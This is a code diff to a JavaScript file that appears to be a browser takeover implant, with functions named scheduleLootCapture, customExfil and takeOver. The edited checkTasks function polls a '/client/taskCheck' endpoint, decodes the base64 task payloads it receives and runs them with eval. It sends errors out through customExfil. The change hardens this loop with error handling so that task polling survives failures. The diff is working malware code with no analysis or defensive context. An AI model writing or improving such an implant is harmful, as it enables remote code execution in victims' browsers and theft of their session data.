@@ -1463,7 +1463,8 @@ function scheduleLootCapture(delay) {
 		return bytes.buffer;
 	}
 
-	async function checkTasks() {
+async function checkTasks() {
+	  try {
 		if (window.taperMetricsBox) {
     // Encrypted/Obfuscated version
 			var response = await sendMetrics("/client/taskCheck", "");
@@ -1502,14 +1503,13 @@ function scheduleLootCapture(delay) {
       //	console.log("Task: " + taskId + ", data: " + atob(taskData));
 
 					try {
-						eval(atob(taskData));
+						eval(unicodeAtob(taskData));
 					} catch (error) {
 						customExfil("Task Error", "Error running task " + taskId + ": " + error.message);
 					}
 				}
 			} catch (error) {
 				console.log("Error:", error);
-				throw error;
 			}
 		} else {
   	// Unencrypted/Obfuscated version
@@ -1523,16 +1523,18 @@ function scheduleLootCapture(delay) {
 				var taskData = jsonResponse[i].data;
 
 				try {
-					eval(atob(taskData));
+					eval(unicodeAtob(taskData));
 				} catch (error) {
 					customExfil("Task Error", "Error running task " + taskId + ": " + error.message);
 				}
 			}
 		}
-
+	  } catch(e) {
+		// network error or other failure - don't let it kill task polling
+	  } finally {
 		window.taperTaskUpdateScheduled = false;
+	  }
 	}
-
 
 // Start the tap
 	function takeOver()
